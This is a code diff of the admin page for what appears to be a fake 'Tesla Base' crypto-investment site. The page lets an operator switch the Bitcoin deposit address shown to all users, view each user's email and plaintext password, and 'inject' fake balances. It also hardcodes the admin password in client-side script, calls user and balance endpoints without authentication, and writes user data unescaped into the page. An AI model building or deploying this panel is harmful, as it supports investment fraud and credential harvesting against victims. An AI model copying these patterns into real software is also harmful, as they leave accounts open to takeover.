@@ -3,55 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tesla Base | Admin Control</title>
+    <title>Tesla Base | Admin Management</title>
     <style>
         body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; }
-        .container { max-width: 1000px; margin: auto; }
+        .container { max-width: 1100px; margin: auto; }
         .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #E31937; padding-bottom: 10px; margin-bottom: 30px; }
-        .card { background: #111; border: 1px solid #222; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
-        h2 { color: #E31937; margin-top: 0; }
-        
-        /* Wallet Update Section */
-        .wallet-box { display: flex; gap: 10px; }
-        input { flex: 1; padding: 12px; background: #000; border: 1px solid #333; color: #fff; border-radius: 5px; }
-        button { padding: 12px 25px; background: #E31937; border: none; color: #fff; font-weight: bold; border-radius: 5px; cursor: pointer; }
-        
-        /* User Table */
-        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
-        th { text-align: left; background: #222; padding: 15px; border-bottom: 2px solid #333; }
-        td { padding: 15px; border-bottom: 1px solid #222; font-family: monospace; }
-        tr:hover { background: #151515; }
+        .card { background: #111; border: 1px solid #222; padding: 25px; border-radius: 12px; margin-bottom: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        h2 { color: #E31937; margin-top: 0; font-size: 20px; text-transform: uppercase; letter-spacing: 1px; }
+        .wallet-box { display: flex; gap: 10px; margin-top: 15px; }
+        input { flex: 1; padding: 14px; background: #000; border: 1px solid #333; color: #fff; border-radius: 6px; font-size: 15px; }
+        button { padding: 14px 25px; background: #E31937; border: none; color: #fff; font-weight: bold; border-radius: 6px; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #b31329; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #0a0a0a; }
+        th { text-align: left; background: #1a1a1a; padding: 15px; color: #888; text-transform: uppercase; font-size: 12px; }
+        td { padding: 15px; border-bottom: 1px solid #222; font-family: 'Courier New', monospace; font-size: 14px; }
         .balance { color: #00ff00; font-weight: bold; }
-
-        .status-msg { margin-top: 10px; font-size: 14px; display: none; }
+        .status-msg { margin-top: 10px; font-weight: bold; display: none; }
     </style>
 </head>
 <body>
 
-<div class="container" id="adminContent" style="display:none;">
+<div class="container" id="adminContainer" style="display:none;">
     <div class="header">
-        <h1>TESLA BASE ADMIN</h1>
-        <button onclick="logout()" style="background:#333;">Logout</button>
+        <h1>MASTER CONTROL</h1>
+        <button onclick="location.href='/'" style="background:#333;">View Website</button>
     </div>
 
     <div class="card">
-        <h2>Update Bitcoin Deposit Wallet</h2>
-        <p style="color:#888; font-size:14px;">This address will be displayed to all users on the deposit page.</p>
+        <h2>Global Bitcoin Deposit Wallet</h2>
+        <p style="color:#666;">Change the BTC address shown to all users for deposits.</p>
         <div class="wallet-box">
-            <input type="text" id="newBtcAddress" placeholder="Enter new BTC Address">
-            <button onclick="updateWallet()">Update Website</button>
+            <input type="text" id="btcInput" placeholder="Enter New Bitcoin Address">
+            <button onclick="updateBtc()">Update Website</button>
         </div>
         <p id="walletStatus" class="status-msg"></p>
     </div>
 
     <div class="card">
-        <h2>User Accounts (Emails & Passwords)</h2>
+        <h2>User Database (Emails & Passwords)</h2>
         <table>
             <thead>
                 <tr>
-                    <th>Email</th>
+                    <th>User Email</th>
                     <th>Password</th>
-                    <th>Balance</th>
+                    <th>Current Balance</th>
                     <th>Actions</th>
                 </tr>
             </thead>
@@ -63,84 +58,67 @@
 
 <script>
     const ADMIN_PASS = "SOLOMON200";
-    const baseUrl = "https://tesla-base.onrender.com"; // Your Render URL
+    const api = window.location.origin;
 
-    // Simple Gatekeeper
     window.onload = function() {
-        const auth = prompt("Enter Admin Password:");
-        if (auth === ADMIN_PASS) {
-            document.getElementById('adminContent').style.display = 'block';
-            loadUsers();
+        const pass = prompt("Enter Admin Secret Key:");
+        if (pass === ADMIN_PASS) {
+            document.getElementById('adminContainer').style.display = 'block';
+            loadData();
         } else {
             alert("Access Denied");
-            window.location.href = "index.html";
+            window.location.href = "/";
         }
-    }
+    };
 
-    // FEATURE: Update Bitcoin Wallet
-    async function updateWallet() {
-        const newAddress = document.getElementById('newBtcAddress').value;
-        const status = document.getElementById('walletStatus');
-        
-        if(!newAddress) return;
-
+    async function updateBtc() {
+        const addr = document.getElementById('btcInput').value;
+        const msg = document.getElementById('walletStatus');
+        if(!addr) return;
         try {
-            const res = await fetch(`${baseUrl}/api/admin/update-wallet`, {
+            const res = await fetch(`${api}/api/admin/update-wallet`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ password: ADMIN_PASS, newAddress: newAddress })
+                body: JSON.stringify({ password: ADMIN_PASS, newAddress: addr })
             });
-            if (res.ok) {
-                status.innerText = "✅ Bitcoin address updated successfully!";
-                status.style.color = "#00ff00";
-                status.style.display = "block";
+            if(res.ok) {
+                msg.innerText = "Successfully updated website wallet!";
+                msg.style.color = "#00ff00";
+                msg.style.display = "block";
             }
-        } catch (e) {
-            status.innerText = "❌ Update failed.";
-            status.style.color = "#ff3b3b";
-            status.style.display = "block";
-        }
+        } catch(e) { alert("Error connecting to server"); }
     }
 
-    // FEATURE: View Emails, Passwords, and Balances
-    async function loadUsers() {
+    async function loadData() {
         try {
-            const res = await fetch(`${baseUrl}/api/admin/users`);
+            const res = await fetch(`${api}/api/admin/users`);
             const users = await res.json();
             const table = document.getElementById('userTable');
             table.innerHTML = "";
-
-            users.forEach(user => {
+            users.forEach(u => {
                 table.innerHTML += `
                     <tr>
-                        <td>${user.email}</td>
-                        <td>${user.password}</td>
-                        <td class="balance">$${parseFloat(user.balance).toLocaleString()}</td>
-                        <td><button onclick="injectFunds('${user.email}')" style="padding:5px 10px; font-size:12px;">Add Funds</button></td>
+                        <td>${u.email}</td>
+                        <td style="color:#E31937">${u.password}</td>
+                        <td class="balance">$${parseFloat(u.balance).toLocaleString()}</td>
+                        <td><button onclick="addFunds('${u.email}')" style="padding:6px 12px; font-size:11px;">Inject Funds</button></td>
                     </tr>
                 `;
             });
-        } catch (e) {
-            console.error("Failed to load users");
-        }
+        } catch(e) { console.error("Load error"); }
     }
 
-    async function injectFunds(email) {
-        const amount = prompt(`How much to add to ${email}?`);
-        if (amount) {
-            await fetch(`${baseUrl}/api/user/update-balance`, {
+    async function addFunds(email) {
+        const amt = prompt(`Add amount to ${email}:`);
+        if(amt) {
+            await fetch(`${api}/api/user/update-balance`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ email: email, amount: parseFloat(amount) })
+                body: JSON.stringify({ email, amount: parseFloat(amt) })
             });
-            loadUsers();
+            loadData();
         }
     }
-
-    function logout() {
-        window.location.href = "index.html";
-    }
 </script>
-
 </body>
 </html>
